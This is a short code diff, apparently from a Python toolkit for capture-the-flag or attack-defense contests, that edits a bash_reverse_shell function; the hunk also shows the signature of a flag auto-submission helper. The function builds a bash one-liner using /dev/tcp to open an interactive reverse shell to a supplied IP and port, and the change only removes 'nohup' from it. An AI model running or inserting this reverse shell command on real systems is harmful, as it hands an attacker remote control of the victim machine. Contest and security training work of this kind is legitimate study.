@@ -59,7 +59,7 @@ def php_auto_submit_flag(flag_url, token, flag_path, path=None) -> str:
 
 
 def bash_reverse_shell(ip, port) -> str:
-    cmd = f'nohup /bin/bash -c \'/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\''
+    cmd = f'/bin/bash -c \'/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\''
     return cmd
 
 
